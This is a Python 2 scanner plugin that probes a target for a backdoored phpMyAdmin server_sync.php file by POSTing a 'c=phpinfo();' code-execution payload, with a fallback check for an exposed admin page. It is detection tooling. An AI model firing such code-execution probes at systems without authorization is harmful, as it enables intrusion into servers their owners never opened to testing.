#!/usr/bin/env python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        header = {"Content-Type":"application/x-www-form-urlencoded", "Host": domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        detail = ''    
        url = "%s://%s%s" % (ob['scheme'],domain,ob['path'])
        expurl="%s%s"%(url,"phpMyadmin/server_sync.php")
        expurl1="%s%s"%(url,"pma/server_sync.php")
        expurl2 = "%s%s"%(url,"phpMyadmin/")
        data="c=phpinfo();"
        res, content = http.request(expurl,'POST',data,headers=header)
        if content.find('<title>phpinfo()</title>')>=0:
            request = getRequest(expurl, domain=ob['domain'])
            response = getResponse(res, content)
            detail="访问到phpMyAdmin管理后台或者后门文件"
            list.append(getRecord(ob,expurl,ob['level'],detail,request,response))
        else:
            res, content = http.request(expurl1,'POST',data,headers=header)
            if content.find('<title>phpinfo()</title>')>=0:
                request = getRequest(expurl, domain=ob['domain'])
                response = getResponse(res)
                detail="访问到phpMyAdmin管理后台或者后门文件"
                list.append(getRecord(ob,expurl1,ob['level'],detail,request,response))
            else:
                res, content = http.request(expurl2,'GET',headers=header)
                if content.find('phpMyAdmin')>=0 and content.find('Welcome')>=0:
                    request = getRequest(expurl2, domain=ob['domain'])
                    response = getResponse(res, content)
                    detail="访问到phpMyAdmin管理后台或者后门文件"
                    list.append(getRecord(ob,expurl2,ob['level'],detail,request,response))

            
    except Exception,e:
        logger.error("File:phpMyadminblackdoorscript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def 
